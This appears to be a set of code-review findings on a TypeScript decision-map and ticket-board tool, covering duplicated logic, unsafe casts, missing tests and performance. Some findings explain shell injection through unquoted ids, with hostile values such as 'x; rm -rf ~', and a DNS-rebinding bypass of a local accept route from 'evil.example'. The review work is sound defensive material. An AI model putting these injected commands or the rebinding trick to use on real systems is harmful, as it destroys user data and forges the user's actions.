review.impact: This line copies how `appendEvent` in `src/map/log.ts` builds a stored event: `seq` is the last seq plus 1, `at` is `new Date().toISOString()`, and the actor is attached. The check runs on this copy, and the append builds the event a second time. If `appendEvent` later changes how it assigns seq, time or actor, the contract check judges a different event from the one the log writes. Each verb also reads and parses the log twice.
review.fix: Export one helper from `src/map/log.ts` that turns a `NewEvent`, an actor and the previous events into an `Event`, for example `stamp(prev, event, actor)`. Use it in `appendEvent` and in `runMapVerb`. Better: let `appendEvent` take the stamped event or the events already read, so the log is read once. Also remove the `as Event` cast where the helper's types make it unnecessary.

review.impact: The kill parts are listed twice: in the `PARTS` const here and in the `KillPart` union in `src/map/rules.ts:171`. If someone adds a part to one list and not the other, the CLI drops the flag without an error, or the rule never receives it.
review.fix: In `src/map/rules.ts`, define `export const KILL_PARTS_FLAGS = ['text', 'source', 'metric', 'threshold', 'window', 'min-sample'] as const` and derive `KillPart` from it as `(typeof KILL_PARTS_FLAGS)[number]`. Import that const in `kill.ts`, the same way `KILL_FORMS` is shared now.

review.impact: `parts as Record<KillPart, string>` removes the `Partial` from the type. The fields that the following code reads, for example `p.source`, are then typed as `string`. The code is correct now only because the earlier `needs` check ran. If the `KILL_PARTS` table changes, the compiler does not report a missing required part.
review.fix: Build the criterion without the cast. For example, narrow each needed part with a small `required(part)` helper that returns a `string`, or read the parts with `!` next to the `needs` check that proves they exist.

review.impact: The criterion is built with a nested ternary over `form`. `killLine` in `show-text.ts` handles the same union with a `switch`. The two styles differ, and if a fifth form is added, the ternary sends it to the `{ form, text }` branch with no exhaustiveness error.
review.fix: Build the criterion with a `switch (form)` that has one case per `KillForm`. Then the compiler reports a form that has no case.

review.impact: The test 'a link is a change to the node it points from' passes even if `subjectOf` returns `payload.to` instead of `payload.from`. Card `s` is not decided. Card `a` holds every fact, and `supported_by` is not a frozen edge type. So both assertions return undefined whatever node the check picks. The rule that the test names has no guard.
review.fix: Add a case where the subject matters. Use a decided card that lacks a fact, for example `noKill`, plus an open card `c`. Assert that `check(noKill, linked('c', 'a', 'depends_on'))` is undefined, because only `c` is checked. Then assert that `check(noKill, linked('a', 'c', 'depends_on'))` refuses with `amend: true`.

review.impact: No test covers a `node.edited` event that sets only `noBasis` on a decided card. Nothing pins that this edit is a free change and not an amend. If `changesFrozen` treats `noBasis` as frozen, no test fails. Then a card decided before the kill fact was required cannot take a no-basis reason without the kill fact first.
review.fix: Add `expect(check(old, noBasis('a', 'a root'))).toBeUndefined()`. `old` is the decided card without a kill criterion.

review.impact: The loop over `['0', '2.5', 'many']` checks only `.ok === false`. If `kill` refuses for a different reason, such as a stray-part error, the test still passes. The `--min-sample must be a whole number above zero` message has no assertion.
review.fix: Assert the full error, for example `toEqual({ ok: false, error: `--min-sample must be a whole number above zero, not "${n}"` })`.

review.impact: missingFacts puts the card id, the waiting basis id and the free option id into shell command lines without quotes. The refusal prints these lines for an agent to run. propose() does not restrict the characters in an id. An id such as `a;rm -rf x` or `a $(cmd)` therefore prints a command that a shell splits or expands when an agent pastes it. The id comes from the same local user, so the risk is low. But the printed line is presented as a safe fix to run.
review.fix: Quote each interpolated id in the printed commands with a small shell-quote helper, for example single quotes with `'` escaped. Or validate ids at propose time against a safe pattern such as /^[A-Za-z0-9:_.-]+$/, so every printed command is safe to run.

review.impact: Every map verb now folds the whole log two times: once for `call.state` and once more for `fold([...events, next])`. It also copies the event array. Each write therefore costs about twice the O(n) fold over the full log, where n is the log length. Most verbs touch a card that is not decided and is not being decided, so `checkChange` returns `undefined` and the second fold is wasted work. The cost grows linearly as the log grows. It is not a defect at the current log size.
review.fix: Before the second fold, return early when no check can apply. Skip the check when the subject of `ruling.event` is not decided in `call.state`, and the event is neither a `node.status_set` to `decided` nor a `node.proposed` with status `decided`. An alternative: apply the one new event to the folded state with an incremental fold step, and do not re-fold the whole log.

causeOfLast.why: the main line added `src/map/graph.ts` to the pure-file list on the same line where this ticket added `src/map/contract.ts`.

review.impact: `runMapVerb` rebuilds the log stamp by hand (`seq: (events.at(-1)?.seq ?? 0) + 1`, `at`, `actor`) and uses an `as Event` cast. This copies the private stamping logic of `appendEvent` in `src/map/log.ts`. If the log later changes how it assigns `seq`, `at` or other envelope fields, the contract check folds a different event than the one the log writes, and the cast hides the type drift.
review.fix: Move the stamping into one exported function in `src/map/log.ts`, for example `stamp(prev: Event[], event: NewEvent, actor: Actor): Event`. Make `appendEvent` use it. Make `runMapVerb` use it to build `next`, so that the check and the append share one definition.

review.impact: `missingFacts` is in a pure map module, but it builds full CLI command lines (`werk edit ...`, `werk link ...`, `werk kill ...`, and the `&&` chain). The map layer now depends on the verb names, the flag syntax and shell quoting of the CLI. A rename of a verb or a flag in `src/cli/verbs/*` does not cause a type error, and only the process tests detect the stale text.
review.fix: Return structured fix data from `missingFacts` (the verb, the operands and the flags). Render the command strings in `refusalText`, or in a CLI-side formatter next to the verb registry, so that one module owns the CLI syntax.

review.impact: The `rule` callback packs the flag-to-parts conversion into one long expression (`Object.fromEntries(PARTS.flatMap(...))`) with a non-null assertion. It is hard to read, and it does not match the other verb files, which pass named fields to the rule.
review.fix: Extract a small named helper, for example `const partsOf = (flags: Map<string, string>) => ...`, above `registry.register`, and call `kill(state, { id, form: flags.get('form')!, parts: partsOf(flags) }, actor)`.

review.impact: The code that builds the event the contract check folds (`seq`, `at`, `actor`, and an `as Event` cast) is a copy of the stamping code inside `appendEvent` in `src/map/log.ts`. If one copy changes and the other does not, the check validates an event that differs from the event the log writes. The log file is also read twice for each verb: one time in `readLog` here and one time inside `appendEvent`.
review.fix: Move the stamping into one exported helper in `log.ts`, for example `stamp(prev: Event[], event: NewEvent, actor: Actor): Event`. Use the helper in `runMapVerb` to build `next`. Give the stamped event to a write function such as `appendStamped(path, next)`, so the event that the check sees is the event that the log writes. That removes the duplicate cast and the second read.

review.impact: The list of kill-criterion part names exists two times: as the `PARTS` const in `kill.ts` and as the `KillPart` union in `src/map/rules.ts:171`. If someone adds a part in one place only, the CLI either drops the flag or does not accept it, and the type checker does not report the mismatch.
review.fix: Export `KILL_PARTS_NAMES = ['text', 'source', 'metric', 'threshold', 'window', 'min-sample'] as const` from `rules.ts`, or put it next to `KILL_FORMS` in `events.ts`. Derive `KillPart` from it with `(typeof X)[number]`, and import it in `kill.ts`.

review.impact: The `rule` callback puts the `Object.fromEntries`/`flatMap` part extraction, the non-null assertions, and the `kill` call on one line of about 170 characters. The line is hard to read, and it is the only verb that packs this much logic inline.
review.fix: Move the extraction into a named const or helper, for example `const partsOf = (flags) => Object.fromEntries(PARTS.filter((p) => flags.has(p)).map((p) => [p, flags.get(p)!]))`. Then call `kill(state, { id, form: flags.get('form')!, parts: partsOf(flags) }, actor)`.

review.impact: The `logLines` and `refuses` helpers and the `afterEach` cleanup are copies of the same helpers in `src/cli/map-verbs.test.ts`. The two `refuses` helpers already differ: one expects `code` 1 and the other expects a nonzero code, so the two copies are drifting apart.
review.fix: Move `logLines` and a `refuses(args, code?)` helper into `src/test/harness.ts`, or put them on `Project`. Import them in both test files.

review.impact: The second assertion, `check(decided, linked('s', 'a', 'supported_by'))`, cannot fail. Card `a` already holds every fact, and `supported_by` is not a frozen edge, so the check returns undefined whether `subjectOf` picks `from` or `to`. The test name says it proves that a link changes only the node it points from, but nothing proves that the `to` node is skipped.
review.fix: Point the link at a decided card that lacks a fact, with a frozen edge type. Example: decide `a` without a kill criterion, then assert `check(old, linked('s', 'a', 'depends_on'))` is undefined. The same edge from `a` must refuse with `amend: true`.

review.impact: The loop over `['0', '2.5', 'many']` checks only `.ok === false`. A change that drops the `--min-sample must be a whole number above zero` message, or that refuses for some other reason, still passes.
review.fix: Assert the full ruling for one value, for example `toEqual({ ok: false, error: '--min-sample must be a whole number above zero, not "2.5"' })`.

review.impact: The fix commands that the refusal prints are meant to be copied and run by an agent in a shell. They put node ids into the command with no quotes: `${id}`, `${waiting}` and `${option}`. The diff does not add any check on node ids, and `propose` does not check them either. So an id that holds shell metacharacters becomes shell syntax in the printed line. Examples are `x; rm -rf ~`, `$(...)` and a backtick. The `waiting` id can come from another node that a different actor wrote. An agent that runs the printed line then runs commands that nobody intended.
review.fix: Shell-quote every id that goes into a printed command, with a small `shellQuote` helper (single quotes, with each inner `'` escaped). A better fix is to restrict node ids in `propose` to a safe pattern, for example `/^[A-Za-z0-9][A-Za-z0-9:._-]*$/`, and refuse any other id.

review.impact: Every map verb now folds the whole log two times: `fold(events)` and `fold([...events, next])`. It also copies the full event array. The cost per command is O(n) in the log length both times, so the cost doubles. The log only grows, so each CLI call gets slower over time. The check needs only one event added to the state that is already folded.
review.fix: Make the fold step usable for one event, for example `foldInto(state, event)` or `fold(events, initial)`. Then compute `after` from `call.state` plus `next`, and do not fold the full log again. If `fold` mutates maps, clone `state.nodes` and `state.edges` first.

review.impact: `missingFacts` builds `[...state.edges, ...state.ghostEdges]` and then scans all edges with `filter`, `parentEdge` and `some`. `checkChange` can call it two times for each command, on `before` and on `after`. Each call is O(E) over the whole map, and it copies the edge arrays.
review.fix: Iterate `state.edges` and `state.ghostEdges` in place without the copy. Or collect the edges of `id` (`from === id` or `to === id`) in one pass, and run the basis, parent and option checks on that short list.

review.impact: `call` is set as a side effect inside the rule callback and read later with a non-null assertion (`call!`). The code is correct only while `appendRuled` always calls `rule` exactly once before it returns `ok: true`. The type checker does not enforce this. If `appendRuled` changes, for example to retry on a conflict or to return early, `report` gets `undefined` or a stale state, and the compiler gives no warning.
review.fix: Make `appendRuled` return the folded state, or the full ruling, with the written event, for example `{ ok: true; event; state }`. Then build `call` from `request` and `written.state` after the append. Remove the `let call` and the `!`.

review.impact: Before this change, `log.ts` was the storage module: it read and appended JSONL. Now it imports `fold` and the `Ruling` type from `rules.ts`, so the storage layer depends on the domain layer. Each change to the shape of a fold or a rule now touches the log module, and the module is no longer a plain file adapter.
review.fix: Move `appendRuled` to a small module, for example `src/map/write.ts`. That module composes `readLog`, `fold`, a rule, and `appendEvent`. Keep `log.ts` free of the `fold` and `rules` imports.

review.impact: The doc comment calls `appendRuled` 'the one write path of every view'. But the steps read, fold, rule, and append have no lock between them. The server process is now a second writer next to the command line. A CLI `accept` and a ✓ press at the same time can both pass the rule against the same old state, and the log then gets two events that the rule would refuse together.
review.fix: Put an exclusive file lock on the log around the read-fold-append in `appendRuled`, for example an `O_EXCL` lock file next to `log.jsonl`. Or change the comment so it does not claim that the write is atomic.

review.impact: The rule callback assigns `call` as a side effect inside an expression: `(call = { ...request, state })`. Line 55 then needs the non-null assertion `call!` to read it. The type checker cannot prove that `call` is set when the append succeeds. A reader must trace the closure to see why the assertion is safe. A later change to `appendRuled`, such as one that does not call the rule on some path, makes the assertion fail at run time with no compile-time error.
review.fix: Make `appendRuled` also return the folded `state`, for example `{ ok: true; event: Event; state: MapState }`. Then build `const call = { ...request, state: written.state }` after the success check and pass it to `spec.report`. This removes the mutable `let`, the assignment inside the expression, and the `!`.

review.impact: The `logLines` helper parses `log.jsonl` by hand and casts each line to an ad hoc type. This repeats `readLog` in `src/map/log.ts`, which `src/cli/serve.test.ts` already imports for the same job. If the log format changes, this copy goes out of date without a type error, because of the `as` cast.
review.fix: Import `readLog` from `../src/map/log.ts` and define `const logLines = (werk: Werk) => readLog(join(werk.dir, '.werk', 'log.jsonl'))`. This returns typed `Event` values, so the cast is not necessary.

review.impact: Two tests repeat the same two `werk.cli(['add', 'g1', ...])` and `werk.cli(['add', 'g2', ...])` calls at lines 38-39 and 67-68 to set up the ghost chain. If the fixture changes, both copies must change together.
review.fix: Extract a small helper, for example `const addGhostChain = (werk: Werk) => { ... }`, and call it from both tests.

review.impact: No test covers two branches of `acceptFromView`. The first is the 400 reply for an id that `decodeURIComponent` cannot decode, for example `/api/accept/%E0%A4%A`. The second is a POST with no `Origin` header, which the server accepts. A regression in the 400 branch, or a change that refuses or accepts a POST with no Origin, passes the suite.
review.fix: Add two checks to the refusal test. First, POST to `${url}api/accept/%E0%A4%A`, expect status 400, and expect the log length to stay `before`. Second, POST to `g` with no origin header and assert the behavior you decided on: 200 and one new event, or a refusal.

review.impact: The unknown-id case checks only the status, 409. Every refusal from the rule maps to 409. If the route refused `nope` for an unrelated reason, for example a wrong id parse, the test still passes.
review.fix: Assert the body too, for example `expect(await res.text()).toContain('nope')`, or match the rule's message for an unknown id.

review.impact: The accept route has no CSRF (cross-site request forgery) defence against DNS rebinding. The origin check only compares `Origin` with the request's own `Host` header. After a DNS rebinding attack, a hostile page at `http://evil.example:<port>` sends `Origin: http://evil.example:<port>` and `Host: evil.example:<port>`. These values match, so the check passes. The hostile page can then POST `/api/accept/<id>` to the local server and append `node.accepted` events with actor `you`. Only the person is supposed to make these events. A request with no `Origin` header also passes the check. With `werk serve --host 0.0.0.0`, any host on the network can accept ghosts with a plain `curl`.
review.fix: Check `req.headers.host` against an allowlist before the write: `127.0.0.1:<port>`, `localhost:<port>`, `[::1]:<port>`, and the configured `--host` value with the bound port. Refuse any other host with 403 or 421. Then require `Origin` to equal `http://<allowed host>`. Also refuse a request with no `Origin`, or ask for a custom header such as `x-werk: 1` that the map page sends. A cross-site form or a simple fetch cannot send that header. Add a test that sends a forged `Host`/`Origin` pair.

review.impact: The 400 and 500 replies echo the id from the attacker-controlled URL in the body. They also echo the internal error message, which can contain the absolute log path. The body is `text/plain`, but the server sends no `X-Content-Type-Options: nosniff`. A client that sniffs content could render the reflected text as HTML. Leaking the path gives away the local file system layout.
review.fix: Add `x-content-type-options: nosniff` to the headers in `send()`. For the 500 reply, write the details to the server log only and return a generic message.

review.impact: `refinesTree` now runs over every node, ghosts included, not only the real nodes. `childrenOf` scans all of `graph.nodes` once for each node, and copies the `seen` set at each level. The cost is O(n²) time plus O(n·depth) set copies, and ghosts now count in n. Agents can propose many ghosts, so each redraw of the map and each card page costs more. At the present map sizes the cost is small.
review.fix: Group the nodes by parent one time, before the walk: `const byParent = new Map<string, MapNode[]>()`, built in log order from `parents`. Then use `byParent.get(id) ?? []` in `childrenOf`, and keep one shared `seen` set or the path-set check. The walk is then O(n).

grade.gap: This diff builds only the five columns. It does not build the three actions from #werk-board-control. Another ticket builds them, so the line passes.

review.impact: `boardPath` is a board concern, but it lives in the map module. The server now imports the board log location from `map/log.ts`, and the board events and fold from `board/`. A reader looks in `src/board/` for the board log path and does not find it. The map module also has to know about a sibling log that it does not use.
review.fix: Move `boardPath` to a new `src/board/log.ts` that calls the generic `readLog`. Or move the generic JSON-lines reader to a shared module, for example `src/log/jsonl.ts`. Then `map/log.ts` and `board/log.ts` each own only their own path.

review.impact: `sendJson` now serves both `/api/graph` and `/api/board`. Its 500 body always starts `werk: cannot read the log:`, so the message calls the board log 'the log'. The path in the parse error names the file, but a fold error has no path, and then nothing tells the user which log failed.
review.fix: Pass a short name to `sendJson`, for example `sendJson(res, 'the board log', () => ...)`, and write it into the 500 body.

review.impact: The new board test copies the SSE read loop from the test above (line 155, the local `readUntil`). The copy reads `: connected` differently: it does not check `done`, so a closed stream makes the loop run forever and the test hangs until TIMEOUT. A fix to one copy will not reach the other.
review.fix: Move `readUntil` to a module-level helper, for example `openEvents(url)` that returns `{ readUntil, cancel }`. Use it in both tests.

review.impact: The `move` helper writes the column union out by hand (`'blocked' | 'ready' | ...`). It does not import `Column`. If a column is added or renamed, the test helper can drift from `COLUMNS`.
review.fix: Import `type Column` from './events.ts' and type the parameter as `to: Column`.

review.impact: `readLog<E = Event>` returns `JSON.parse(line) as E`. This is an unchecked cast, and the generic hides it from callers. Any caller can choose any type, and nothing validates it. Also, `boardPath` is a board concern, but it lives in the map module.
review.fix: Keep the generic, but add a typed wrapper `readBoardLog(path): BoardEvent[]` in `src/board/` next to `boardPath`. Then the cast happens in one named place for each log, and the board module owns its path.

review.impact: `watchLogs(paths)` watches only `dirname(paths[0])`. It ignores the directories of the other paths without a check. A future caller that passes a path in a different directory gets no change events and no error.
review.fix: Change the signature to `watchLogs(dir: string, names: string[], ...)`, or check that every path has the same dirname and throw if one does not.

review.impact: `MapPage` and `BoardPage` repeat the same error and loading branches. Only the URL, the label, and the view change. A change to error handling must be made in two places.
review.fix: Add a `LivePage<T>({ url, noun, children: (data: T) => ReactNode })` component that holds the error and loading branches. Use it in both pages.

review.impact: Line 25 builds the column locator again and repeats the `li[data-ticket=...]` selector. It does not use the `tickets` locator from line 23 or the `ticket` helper. The selector now has three copies in the file.
review.fix: Use `tickets.and(ticket(page, n))`, or `tickets.filter(...)`, or a `ticketIn(scope, n)` helper. Then the selector is in one place.

review.impact: `routeOf` is a pure parser, but no unit test covers it. The e2e tests cover only `#/board`, `#/board/3` and `#map-hash`. These edge cases have no test: a trailing slash (`#/board/3/`), a non-numeric ticket (`#/board/abc`, which falls through to a map card id), `#/board/0`, the empty hash, and a decoded card id that holds a slash. A change to the regex can break one of these routes, and no test fails.
review.fix: Add `web/src/useRoute.test.ts` (or a test beside it under `bun:test`) with a table test for `routeOf`. Cover '', 'map-hash', '/board', '/board/', '/board/3', '/board/3/', '/board/abc' and '/board/03'. Assert the exact `Route` object for each one.

review.impact: No test covers the failure path of the drawer: a hash such as `#/board/99` names a ticket that is not on the board. Only the `Drawer` branch that renders `No ticket {number} on the board.` handles this case. If that branch breaks, the page can crash on a stale or shared link, and no test fails. The blocker list item for a blocker that is not on the board ('ticket N' / 'not on the board') also has no test.
review.fix: Add an e2e test that runs `page.goto(`${werk.url}#/board/99`)`. Assert that the region named 'drawer' contains a `role=alert` with 'No ticket 99 on the board.', and that the five columns still render.

review.impact: `toContainText('retries1')` matches the concatenated dt/dd text. It also passes for 'retries10' or 'retries12'. It also depends on no whitespace between the `<dt>` and the `<dd>`. A wrong retry count with a leading 1 passes, and a markup change that adds whitespace fails for no real reason.
review.fix: Locate the `dd` that follows the `dt` with the name 'retries', and assert `toHaveText('1')`. For example, use `metadata.locator('dt:text-is("retries") + dd')`.

review.impact: Two rules of the fold have no test. A move to blocked with no reason must leave `reason` undefined. A second planned event for a ticket in blocked must keep its reason (the `reason` spread in the `ticket.planned` case). A regression in either rule passes the suite.
review.fix: Add one case: `foldBoard(log(ticket(1), move(1, 'blocked')))` gives `reason` undefined. Add a second case: `foldBoard(log(ticket(1), move(1, 'blocked', 'a cycle'), ticket(1, { title: 'Renamed' })))` keeps `reason: 'a cycle'` and `column: 'blocked'`.

review.impact: `readLog<BoardEvent>` casts each line without a check. A `ticket.moved` event with an unknown `to` value, for example `"to":"bulding"`, sets `column` to a value that is not in `COLUMNS`. The ticket then disappears from all five columns and gives no error. A `ticket.planned` payload with a missing or non-array `blockedBy` makes `foldBoard` throw. The server then sends a 500 for the whole board because of one bad line.
review.fix: Check each board event at the read seam before the fold uses it. Confirm that `to` is in `COLUMNS`, that `number` is an integer, and that the array fields are arrays. Throw an error that names the line (`board.jsonl:<n>`), in the same way that the JSON parse error does now.

review.impact: One `changed` event now covers both log files. A write to `board.jsonl` makes an open map page fetch `/api/graph` again, and the server reads and folds the whole decision log again. A write to `log.jsonl` does the same for an open board page. The fetched data has not changed, so this work and the transfer are wasted. The cost is one extra read and fold for each write, so the cost grows with the log size.
review.fix: Name the log that changed. Use one SSE event name for each log, for example `event: graph` and `event: board`, or put the log name in the `data` field. Then `useLive` listens only for the event of its own URL. Another option is one `watchLogs` callback for each file, each pushing its own event.

causeOfLast.why: main added the contract check to the CLI write path at the same time this ticket moved that path into `appendRuled`.

review.impact: The log module's header says it 'appends and reads' the file. It now also imports fold, contract and rules, so the lowest-level IO module depends on the domain policy modules. This reverses the layering: every caller that only wants readLog/appendEvent now pulls in the contract check and the rules types. A future import from contract.ts or rules.ts back into log.ts makes a cycle.
review.fix: Move appendRuled into its own module above log.ts, for example src/map/write.ts. That module imports log, fold, contract and rules. Keep log.ts as pure file IO, and update the header comment to match.

review.impact: appendRuled builds the next event (seq, at, actor) itself for the contract check. Then appendEvent reads the log again and builds the event a second time. The checked event and the written event can differ: `at` always differs, and `seq` differs if another writer appended in between. The CLI and the server can now both write, so the read-check-append sequence is not atomic. A concurrent write can pass a check that ran against an older state.
review.fix: Build the Event one time and pass it to a lower-level append (for example appendWritten(path, event)), or let appendEvent accept the events it already read. Document that the read-check-append sequence is not atomic, or take a simple file lock around it.

review.impact: `call` is assigned as a side effect inside the rule callback, and the code then reads it with a non-null assertion `call!`. The type system cannot see the data flow, so a future change to appendRuled (for example a short-circuit before the rule runs) makes `call` undefined at runtime with no compile error.
review.fix: Return the state from appendRuled on success, for example { ok: true; event; before: MapState }. Then build the call as `{ ...request, state: written.before }` after the write, or let the rule callback's return carry the call. This removes the mutable closure variable and the `!`.

review.impact: `appendRuled` builds the candidate event with its own copy of the seq/at/actor logic and its own `as Event` cast. This code duplicates the code in `appendEvent` (line 33), and `appendEvent` then reads the log a second time. If someone changes how the log assigns `seq` or `at` in one place only, the contract check runs on an event that is different from the event the log writes.
review.fix: Extract one helper, for example `stamp(events, event, actor): Event`, that assigns seq, at and actor. Use it in both functions. Then make `appendRuled` append the stamped `next` event directly, so it does not call `appendEvent` and read the log again.

review.impact: The code gets `call` back from the rule callback through an assignment inside an expression (`spec.rule((call = { ...request, state }))`). It then reads `call!` on line 55. The non-null assertion hides from the type checker the fact that `call` is set only as a side effect of the callback. A future change to `appendRuled`, such as a short-circuit before it calls `rule`, gives `undefined` to `spec.report` and the type checker does not see it.
review.fix: Make `appendRuled` return the folded `state` it gave to the rule in the ok result, for example `{ ok: true; event; state }`. Then build `const call = { ...request, state: written.state }` after the append and remove the mutable `let` and the `!`.

review.impact: The module doc comment still says that `runMapVerb` reads and folds the log, runs the contract check, and appends the event. That work now lives in `appendRuled`, which has its own doc comment with the same text. The two descriptions can drift apart.
review.fix: Shorten the map-verb.ts header to say that it parses the call and passes it to `appendRuled` (#werk-write). Keep the full description only on `appendRuled`.

review.impact: `logLines` here and `logLines` in e2e/map.spec.ts both rebuild the `.werk/log.jsonl` path by hand. e2e/map.spec.ts also parses the JSON lines itself instead of calling `readLog`. If the log location changes, more than one test helper must change.
review.fix: Use `readLog` in the e2e helper too. Consider a small helper, for example `logOf(dir)`, in the test harness that both suites import.

review.impact: No test covers the contract-check refusal on the new accept route. The route sends a `checkChange` refusal through `appendRuled` and must answer 409 and append nothing. Only the rule refusals ('already real', unknown id) are tested. `appendRuled` in src/map/log.ts also has no unit test. A later change could skip `checkChange` for the browser ✓ (#map-frozen), and no test would fail.
review.fix: Add a unit test for `appendRuled` in src/map/log.test.ts. Give it a rule whose event the contract refuses. Assert `{ ok: false }`, assert the error text equals `refusalText(...).join('\n')`, and assert the log length does not change. If an accept can trip the contract, also add a serve test that POSTs that accept and expects 409 with nothing appended.

review.impact: Two server branches have no test. A percent-encoding that is not valid (for example `/api/accept/%E0%A4%A`) must return 400. A POST with no `origin` header is accepted. A change to either guard, such as a crash on a malformed id, goes unnoticed.
review.fix: Add one assertion: a POST to `${url}api/accept/%E0%A4%A` returns 400 and appends nothing. Add one more assertion that states what a POST with no origin header must do, so the decision is in a test.

review.impact: The refused-✓ test checks only that the alert appears. It does not check that the alert clears on the next press, which the AcceptButton doc promises. It also does not check that a press with no server answer shows the 'did not answer' alert. The final `data-proposed` = 'true' assertion passes even without the change, because the route is mocked and nothing is appended.
review.fix: After the 409, call `page.unroute`. Press ✓ again and assert that the alert is gone and `data-proposed` becomes 'false'. Optionally add a `route.abort()` case and assert that the alert contains 'the server did not answer'.

review.impact: `refinesTree` and `ancestorsOf` now follow `ghostEdges`. The cycle test still covers only real edges. A cycle in a hand-edited log that runs through ghost edges is not tested, and this is the new input that the `seen` guard must stop.
review.fix: Add a case where two ghosts propose each other as parent, or where a ghost and a real node form a refines cycle through ghostEdges. Assert that `refinesTree` and `ancestorsOf` return and do not loop.

review.impact: The origin check compares `Origin` with the `Host` header of the same request, and the attacker controls both. In a DNS rebinding attack, a page on `http://evil.example:<port>` resolves to 127.0.0.1 and sends `Origin: http://evil.example:<port>` with `Host: evil.example:<port>`. The two values match, so the check passes. A remote page can then accept any ghost on the person's map as actor `you`. This defeats the 'accept is for the person alone' rule.
review.fix: Check the `Host` header against a fixed allow-list built from the bound address (`127.0.0.1:<port>`, `localhost:<port>`, and the `--host` value). Return 403 when it does not match. Then compare `Origin` with that allowed host and not with `req.headers.host`.

review.impact: A request with no `Origin` header passes. Modern browsers send `Origin` on a cross-site POST, but older browsers and some privacy extensions strip it. In those cases a cross-site `<form method=POST action=http://127.0.0.1:<port>/api/accept/<id>>` can accept a ghost.
review.fix: Also refuse a request whose `Sec-Fetch-Site` is present and is not `same-origin`. Or require a custom request header, for example `x-werk: 1`, which a cross-site form cannot set. Send that header from `AcceptButton`.

review.impact: `childrenOf` scans all of `graph.nodes` for each node in the tree, so `refinesTree` costs O(n²). It also copies the `seen` set at each level. This code existed before. The change now adds ghosts to the tree, so n grows. The map runs `refinesTree` again on each redraw after every log change. A large map with many proposals redraws more slowly.
review.fix: Build a `Map<parentId, MapNode[]>` once, in log order, from `graph.nodes` and `parentsOf(graph)`. Then look up the children of each node directly. Use one shared `seen` set on the current path: add the id before the recursion and delete it after the recursion.

causeOfLast.why: the board ticket merged first and changed the same header comment, import line, and end of the stylesheet as this ticket.

grade.gap: No control accepts a card outside the proposed branch. The ✓ and `POST /api/accept/<id>` each send one id, and the `accept` rule appends one `node.accepted` event. The `acceptedBranch` function in `src/map/fold.ts` then makes real the ghost refines ancestors and the card's own ghost options and sources. The e2e test in e2e/map.spec.ts checks that a ghost sibling (`g3`) and the unrelated `ghost` stay proposed. One gap is open: no browser test checks that an option linked to an accepted ancestor is accepted with the branch. Only src/cli/serve.test.ts covers that case (`opt: false`).

No contradiction. A ghost shows grey and dashed under its proposed parent with the `.ghost` class in web/app.css, so it does not use the blue pending-edit tint. Accept takes one card at a time with the ✓ on the card view. The diff has no batch accept. The server route sets the actor to `you`, and the check that the person asked applies only to the command line. The accept goes through `appendRuled`, so the contract check runs. One small point: the ✓ shows only on the card detail page and not in the tree (see the test 'the map view has no accept control' in e2e/map.spec.ts). The card does not say where the ✓ must sit, so this passes.

review.impact: `runMapVerb` gets the folded state out of `appendRuled` through a side effect: the rule callback assigns the outer `call` variable, and the code then reads it with the non-null assertion `call!`. The code is correct only because `appendRuled` always calls the rule before it returns `ok: true`. The type system does not check this, so a future change to `appendRuled` (for example, a short-circuit path that returns `ok: true` without the rule) would break `spec.report` with no type error.
review.fix: Make `appendRuled` return the state it folded on success, for example `{ ok: true; event: Event; before: MapState }`. Then build `call` after the write as `{ ...request, state: written.before }`, and remove the captured variable and the `!`.

review.impact: The rule callback assigns the outer `let call` inside an expression (`spec.rule((call = { ...request, state }))`), and line 55 then uses a non-null assertion, `call!`, to get the value out. The type checker cannot see that `call` is set whenever `written.ok` is true, so `call!` turns that check off.
